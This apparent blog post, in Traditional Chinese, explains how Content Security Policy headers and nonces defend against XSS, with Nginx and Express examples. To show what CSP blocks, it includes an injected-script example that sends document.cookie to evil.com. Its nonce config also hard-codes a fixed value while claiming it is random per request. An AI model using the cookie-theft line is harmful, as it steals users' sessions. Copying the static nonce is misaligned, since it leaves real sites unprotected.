---
title: "Content Security Policy：防禦 XSS 的強力武器"
date: 2018-11-27 10:19:48
tags:
  - 安全
readingTime: 1
description: "設定了 CSP 之後，即使 XSS 注入成功，攻擊者也無法外鏈或執行惡意腳本。"
wordCount: 274
---

配置了 CSP 之後，即使 XSS 注入成功，攻擊者也無法外鏈或執行惡意腳本。

## 什麼是 CSP

Content Security Policy 是 HTTP 響應頭，告訴瀏覽器哪些資源可以加載和執行：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'
```

瀏覽器會拒絕所有不符合策略的資源加載，包括內聯腳本。

## 常用指令

```http
# 默認策略（所有未指定的資源類型）
default-src 'self'

# 腳本來源
script-src 'self' https://cdn.jsdelivr.net

# 樣式來源
style-src 'self' 'unsafe-inline'    # 允許內聯樣式（不得不）

# 圖片來源
img-src 'self' data: https:        # data: 允許 base64，https: 允許所有 https

# 字體
font-src 'self' https://fonts.gstatic.com

# AJAX/WebSocket 請求
connect-src 'self' https://api.example.com wss://ws.example.com

# 不允許在 iframe 中被嵌入（防止點擊劫持）
frame-ancestors 'none'

# 上報違規（不攔截，隻上報）
report-uri /csp-violation-report
```

## Nginx 設定

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## nonce 方式處理內聯腳本

不想用 `unsafe-inline` 又需要內聯腳本，可以用 nonce：

```nginx
# 每次請求生成隨機 nonce
set $nonce "xK2TnVqD8sP3mR7";
add_header Content-Security-Policy "script-src 'self' 'nonce-$nonce'";
```

```html
<!-- 隻有帶正確 nonce 的內聯腳本才會執行 -->
<script nonce="xK2TnVqD8sP3mR7">
  // 這段腳本可以執行
  var config = { apiUrl: "..." };
</script>

<!-- 攻擊者注入的腳本沒有 nonce，不會執行 -->
<script>
  fetch("https://evil.com?cookie=" + document.cookie);
</script>
```

## 先用 Report-Only 模式試水

直接上 CSP 可能會阻斷正常功能，先用 Report-Only 觀察：

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

不攔截，隻把違規報告發到 `/csp-report`，方便調試。

```javascript
// 接收 CSP 違規報告
app.post(
  "/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.log("CSP 違規:", req.body);
    // 存到日誌系統分析
    res.status(204).end();
  },
);
```

## 常見的 CSP 相容問題

- `eval()`：被 `script-src` 的 `unsafe-eval` 控製，webpack 的某些用法會用到
- 內聯事件處理：`<button onclick="...">` 被阻止，改成 addEventListener
- `<base>` 標籤：影響相對 URL 解析，受 `base-uri` 控製

## 小結

- CSP 是防禦 XSS 的最後一道防線，即使注入了腳本也無法執行
- 先用 `Report-Only` 模式，收集違規後再正式開啓
- nonce 比 `unsafe-inline` 更安全
- `frame-ancestors: none` 同時防止點擊劫持
